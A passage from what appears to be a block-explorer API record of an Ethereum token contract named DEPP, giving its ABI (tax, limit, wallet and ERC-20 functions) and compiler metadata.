\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"sharesTeam\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getLimits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxWalletAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"taxSwapMin\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"taxSwapMax\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getWallets\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"contractOwner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityPool\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"development\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"charity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"team\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"maxTxAmtPermile\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"maxWalletAmtPermile\",\"type\":\"uint16\"}],\"name\":\"increaseLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"ethAmountWei\",\"type\":\"uint256\"}],\"name\":\"initLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"noFees\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"noLimits\",\"type\":\"bool\"}],\"name\":\"setExemptions\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string[]\",\"name\":\"values\",\"type\":\"string[]\"}],\"name\":\"setPrep\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"sharesAutoLP\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"sharesMarketing\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"sharesDevelopment\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"sharesCharity\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"sharesTeam\",\"type\":\"uint16\"}],\"name\":\"setTaxDistribution\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"newBuyTax\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newSellTax\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newTxTax\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"enableBuySupport\",\"type\":\"bool\"}],\"name\":\"setTaxRates\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint32\",\"name\":\"minValue\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"minDivider\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"maxValue\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"maxDivider\",\"type\":\"uint32\"}],\"name\":\"setTaxSwapLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newMarketingWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"newDevelopmentWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"newCharityWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"newTeamWallet\",\"type\":\"address\"}],\"name\":\"setTaxWallets\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"swapTokens\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"sendEth\",\"type\":\"bool\"}],\"name\":\"taxManualSwapSend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingOpen\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "DEPP", "CompilerVersion": "v0.8.13+commit.abaa5c0e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cb6e3785b66cae6cc6f0484a6b7899653f354df7651eb8e92565bab0a7279c7c"}]}